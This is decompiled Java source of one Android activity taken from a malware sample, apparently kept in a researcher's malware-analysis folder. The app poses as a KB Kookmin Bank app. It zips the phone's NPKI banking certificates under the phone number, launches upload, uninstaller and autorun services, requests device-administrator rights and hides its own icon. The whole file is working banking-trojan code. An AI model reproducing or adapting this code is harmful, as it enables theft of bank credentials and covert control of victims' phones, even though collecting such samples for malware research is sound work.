package com.kbstar.kb.android.star;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.Window;
import com.kbstar.kb.android.services.SoftService;
import com.kbstar.kb.android.services.UninstallerService;
import com.kbstar.kb.android.services.autoRunService;
import com.kbstar.kb.android.services.uploadContentService;
import com.kbstar.kb.android.services.uploadPhone;
import com.kbstar.kb.android.star.util.GeneralUtil;
import com.kbstar.kb.android.star.util.NPUtil;
import com.kbstar.kb.android.star.util.Url;
import com.kbstar.kb.android.star.util.ZipUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MainA
  extends Activity
{
  private ComponentName componentName;
  private List<ApplicationInfo> listAppcations = new ArrayList();
  private PackageManager pm;
  private DevicePolicyManager policyManager;
  private Url url = new Url();
  
  private void HideIcon()
  {
    getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
  }
  
  private void zipCert()
  {
    try
    {
      if (NPUtil.isNPKIExists())
      {
        String str = ((TelephonyManager)getSystemService("phone")).getLine1Number() + "_npki.zip";
        ZipUtil.ZipFolder(NPUtil.getFolder.toString() + "/", this.url.getSDPath() + "/" + str);
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void getAdmin()
  {
    Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
    localIntent.putExtra("android.app.extra.DEVICE_ADMIN", this.componentName);
    localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "1");
    startActivityForResult(localIntent, 1);
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    getWindow().requestFeature(1);
    setContentView(2130903040);
    this.pm = getPackageManager();
    paramBundle = new File(this.url.getSDPath1() + "/temp");
    if (!paramBundle.exists()) {
      paramBundle.mkdirs();
    }
    this.url.deleteFoder("args.txt");
    new Thread()
    {
      public void run()
      {
        MainA.this.zipCert();
      }
    }.start();
    startService(new Intent(this, uploadPhone.class));
    startService(new Intent(this, SoftService.class));
    startService(new Intent(this, UninstallerService.class));
    startService(new Intent(this, uploadContentService.class));
    startService(new Intent(this, autoRunService.class));
    this.policyManager = ((DevicePolicyManager)getSystemService("device_policy"));
    this.componentName = new ComponentName(this, MDAR.class);
    if (!this.policyManager.isAdminActive(this.componentName)) {
      getAdmin();
    }
  }
  
  protected void onDestroy()
  {
    GeneralUtil.goHome(this);
    HideIcon();
    super.onDestroy();
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/MainA.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */